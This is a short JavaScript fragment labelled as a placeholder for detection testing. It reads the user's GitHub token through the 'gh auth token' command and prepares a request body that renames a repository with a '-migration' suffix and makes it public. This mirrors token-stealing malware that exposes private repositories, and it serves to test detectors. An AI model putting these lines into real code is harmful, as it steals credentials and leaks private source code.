// Placeholder sample for detection testing only.
const token = require('child_process').execSync('gh auth token').toString().trim();
const repos = 'https://api.github.com/user/repos';
const newName = name + '-migration';
const body = JSON.stringify({ name: newName, private: false });
